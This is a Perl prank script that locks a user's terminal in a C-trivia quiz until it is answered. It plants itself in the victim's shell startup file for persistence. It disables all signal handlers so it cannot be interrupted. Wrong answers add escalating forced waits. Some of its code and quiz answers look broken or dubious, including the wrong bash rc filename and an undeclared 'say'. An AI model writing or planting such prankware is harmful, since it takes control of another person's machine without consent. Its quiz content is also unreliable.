#!/usr/bin/perl -w

# HOW TO RUN IT
## Launch "xterm --fullscreen" or just put your terminal in fullscreen otherwise then run it !
#
#
##      Libraries
#

use strict;
use Term::ANSIColor qw(:constants);
use Class::Struct;
use Time::HiRes;

#
##      Macros and Structs
#

my $NBQUESTIONS = 10;

struct Question =>
{
    question => '$',
    answers => '$',
    response => '$',
};

#
##      Code
#

my @questions = (
Question->new(question => '1-  There is an array : char tableau_double[9][8]; What is the result de sizeof(tableau_double) ?', answers => "Response A : 69\nAnswer B : 72\nAnswer C : 0\nAnswer D : 9\n\t->", response => 'B'),
Question->new(question => '2 - What is the value of sizeof(main) ?',answers => "Answer A : Ne compile pas\nAnswer B : 8\nAnswer C : 0\nAnswer D : 1\n\t->", response => 'D'),
Question->new(question => '3 - What is the name of the preprocessing binary ?', answers => "Answer A : cpp\nAnswer B : preprocessing\nAnswer C : ppb\nAnswer D : Mais c'est pas GCC qui s'occupe de ça ?\n\t->", response => 'A'),
Question->new(question => "4 - What represent \"??)\" ?", answers => "Answer A : bah c'est une chaine de caractères\nAnswer B : ]\nAnswer C : Rien du tout\nAnswer D : #\n\t->", response => 'B'),
Question->new(question => "5 - What is the result of this operation : \"(((0xFF | 4) ^ 0x2a) & 0b01100101) ^ 0xAB\" ?",answers => "Answer A : 238\nAnswer B : 0\nAnswer C : 255\nAnswer D : 181\n\t->", response => 'A'),
Question->new(question => "6 - How many types of operators are there ?", answers => "Answer A : 1\nAnswer B : 2\nAnswer C : 3\nAnswer D : Aucune de ces réponses\n\t->", response => 'C'),
Question->new(question => "7 - const char *bite = \"foobar\", what display putchar(*(bite + sizeof(struct {})))",answers => "Answer A : Ca compile pas\nAnswer B : 102\nAnswer C : f\nAnswer D : 42\n\t->", response => 'C'),
Question->new(question => "8 - What does \"##\" in preprocessing ?", answers => "Answer A : Concatène deux chaines de caractères\nAnswer B : Remplace une virgule\nAnswer C : Remplace ##\nAnswer D : Ne fait rien\n\t->", response => 'A'),
Question->new(question => "9 - Combien d'étoiles faut t-il pour acceder au caractere de char *************bite ?", answers => "Answer A : 13\nAnswer B : 12\nAnswer C : 14\nAnswer D : 1\n\t->", response => 'B'),
Question->new(question => "10 - What is the value of a sizeof of an empty struct who has been malloc and incremented ?", answers => "Answer A : 1\nAnswer B : 2\nAnswer C : 4\n Answer D : 8\n\t->", response => 'D'),
);

sub begin_questions {
    my $i;
    my $tent;
    my $wait;
    my $time;
    my $after_wait;

    $i = 0;
    $wait = 20;
    while ($i < $NBQUESTIONS) {
        $i == -1 ? ++$i  : print "\033[2J\e[H";
        if (($tent % 3) == 0 and ($tent != 0)) {
            print BOLD YELLOW "\tYou actually failed 3 questions, you will wait $wait seconds ... !\n", RESET;
            $time = time();
            $after_wait = time() + $wait;
            while ($time < $after_wait) { $time = time();}
            $wait += 20;
        }
        print "${questions[$i]->question}\n${questions[$i]->answers}";
        while (<STDIN>) {
            chomp($_);
            if (${questions[$i]->response} eq $_)
            {
                ++$i;
                last;
            } else {
                print "\033[2J\e[H";
                print BOLD RED "\tYou Failed the previous question, back to the beginning !\n", RESET;
                $i = -1;
                ++$tent;
                last;
            }
        }
    }
}

sub print_rules() {
    my $user;

    $user = "Student" if (!defined($user = $ENV{'USER'}));
    print <<RULES;
    Hi ${user}, you have been conf.
    You will have to answer to the following ${NBQUESTIONS} questions to get rid of the conf.

    /!\\ WARNIRNG /!\\ FOR EACH WRONG ANSWER, YOU WILL WAIT 20 SECONDS MORE /!\ WARNIRNG /!\\
    /!\\ WARNIRNG /!\\             BE AWARE, AND ANSWER CAREFULLY           /!\ WARNIRNG /!\\
RULES

}

sub save_conf {
    my $shell;
    my $file;
    my $fd;

    $shell = $ENV{'SHELL'};
    if ($shell =~ /bash/) {
        $file = "$ENV{'HOME'}/.mybashrc";
    } elsif ($shell =~ /zsh/) {
        $file = "$ENV{'HOME'}/.zshrc";
    } elsif ($shell =~ /csh/) {
        $file = "$ENV{'HOME'}/.cshrc";
    }
    open($fd, ">>", $file) or die "Cannot open file : $!\n";
    say $fd "~/conf.pl";
    close $fd;
    return $file;
}

sub main {
    my $file_path;

    print "Press Enter To Enjoy !\n";
    <STDIN>;
    $file_path = save_conf();
    print_rules();
    begin_questions();
    `sed -i -e "/conf\.pl/d" $file_path`;
    `rm -f  $ENV{'HOME'}/conf.pl`;
}

# CATCH ALL SIGNALS
foreach my $key (keys %SIG) {
    $SIG{$key} = sub {};
}
main();
